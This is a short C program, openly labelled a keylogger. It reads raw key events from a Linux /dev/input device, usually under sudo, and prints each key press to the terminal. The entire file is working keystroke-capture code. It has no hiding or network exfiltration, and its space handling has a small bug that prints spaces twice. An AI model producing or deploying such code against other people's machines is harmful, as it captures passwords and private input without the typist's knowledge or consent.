#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>



const char *keymap[] = {
    "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>",
    "<TAB>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "<ENTER>",
    "<LCTRL>", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`",
    "<LSHIFT>", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<RSHIFT>",
    "<LALT>", " "
};


int main(int argc, char *argv[]) {
    if(argc < 2) {
        printf("Error: %s NO ARGUMENT\n", argv[0]);
        printf("You need this argument: /dev/input/eventX\n");
        return 1;
    }

    int fd = open(argv[1], O_RDONLY);
    if (fd == -1) {
        perror("Try sudo!!");
        return 1;
    }


    struct input_event ev;
    printf("[+] M Keylogger started. Press CTRL + C to stop\n");

    while(1) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n != sizeof(ev)) {
            perror("read");
            break;
        }


        if(ev.type == EV_KEY && ev.value == 1) { // if its a keyboard stroke and if its pressed; (value 1);
            if(ev.code == KEY_SPACE) {
                printf(" ");
                fflush(stdout);
            }

            if(ev.code < sizeof(keymap) / sizeof(keymap[0])) {
                printf("%s", keymap[ev.code]);
                fflush(stdout); // Immediate output
            }
        }

    }
    close(fd);
    return 0;
    



    


    return 0;
}